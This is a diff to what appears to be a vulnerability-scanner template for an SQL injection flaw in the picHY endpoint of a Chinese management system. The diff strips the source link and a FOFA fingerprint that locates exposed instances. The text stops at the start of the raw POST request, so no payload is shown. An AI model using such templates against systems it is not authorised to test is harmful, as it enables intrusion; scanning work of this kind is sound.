@@ -3,12 +3,8 @@ info:
   name: 九佳易管理系统 picHY.ashx SQL存在注入漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/yzivd2aklqtf8dvq'
+  description: ''
   tags: other,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: yzivd2aklqtf8dvq
-    fofa: body="/XiTong/Index/W_IndexPbForm.win.js"
 http:
 - raw:
   - 'POST /HuiYuan/HuiYuanDangAn/picHY.aspx HTTP/1.1
